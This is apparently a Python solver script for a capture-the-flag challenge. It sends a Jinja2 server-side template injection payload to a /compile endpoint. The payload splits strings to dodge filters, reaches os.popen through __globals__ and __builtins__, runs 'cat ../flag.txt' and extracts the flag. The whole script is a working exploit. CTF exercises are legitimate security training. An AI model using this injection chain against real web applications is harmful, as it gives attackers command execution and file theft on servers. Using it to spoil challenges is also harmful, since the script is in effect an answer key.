import requests
import re

url = "http://chals.cyberthon26f.ctf.sg:36189/"
s = requests.Session()

payload = '''self.__init__ | attr('__glob''als__') | attr('__getitem__')('__buil''tins__') | attr('__getitem__')('__im''port__')('os') | attr('popen')('cat  ../flag.txt') | attr('read')()'''

res = s.post(f'{url}/compile', json={
    'name': 'a',
    'formula': '{{ %s }}' % payload,
    'rune': 'fire'
})

flag = re.findall(r'(Cyberthon{.+?})' , res.text)[0].strip()
print("Flag:", flag)